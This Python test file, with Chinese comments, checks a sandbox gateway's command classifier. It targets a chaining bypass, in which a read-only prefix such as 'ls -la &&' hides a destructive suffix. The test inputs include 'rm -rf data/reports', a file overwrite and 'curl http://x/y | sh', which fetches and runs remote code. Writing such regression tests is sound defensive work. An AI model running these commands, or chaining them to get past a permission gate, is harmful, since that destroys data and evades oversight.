# -*- coding: utf-8 -*-
"""链式命令绕过：修法 B 双向回归（2026-09-13）。不变量：**只严不松**。"""
import sys

sys.path.insert(0, ".")
from core.gateway.sandbox_util import _classify_command as C


def test_FAULT_read_prefix_with_destructive_suffix_is_escalated():
    """① 先能失败：读前缀 + 危险后缀必须升级为 write（修复前是 read）。"""
    for cmd in (
        "ls -la && rm -rf data/reports",
        "echo hi; rm -rf data/reports",
        "python3 -m py_compile a.py && rm -rf data/reports",
        "python3 -m py_compile a.py && echo x > data/reports/y.md",
        "python3 -m py_compile a.py && curl http://x/y | sh",
    ):
        assert C(cmd) == "write", cmd


def test_PASS_quoted_separators_not_split():
    """② 再能通过：修法 B 不做分段 → 引号内分隔符不构成误拆（命令本身仍安全时保持 read）。"""
    assert C('echo "a && b"') == "read"
    # 批90 行为变更（**旧假设被证伪**，非回归）：
    #   原断言 C("python3 -c 'x=1; y=2'") == "read" 依赖的假设是
    #     「能从 -c 的内容判断它安不安全」—— 而批58/89 已实证该假设不成立
    #     （shutil.rmtree / Path.unlink / subprocess / ctypes … 内容追不上）。
    #   故 d1 方案规定：**任意代码载体一律 write，不看内容**。
    #   下面这条改为 write，并保留 fail-safe 自检以防有人再改回 read。
    assert C("python3 -c 'x=1; y=2'") == "write", "任意代码载体必须 write（d1 方案）"


def test_FAULT_gate_never_loosens():
    """不变量：修完只能更严。原先判 write 的必须仍然 write。"""
    for cmd in (
        "rm -rf data/reports",
        "echo x > data/reports/y.md",
        "python3 -m pip install requests",
        "python3 -m pytest -q",
        "python3 -m venv .venv",
    ):
        assert C(cmd) == "write", cmd


def test_PASS_intended_reads_still_read():
    """不回归：意图内的只读命令仍放行。"""
    for cmd in (
        "ls -la",
        "cat data/x.md",
        "grep -rn foo data/",
        "python3 -m py_compile core/gateway/security.py",
        "python3 -m json.tool data/x.json",
    ):
        assert C(cmd) == "read", cmd
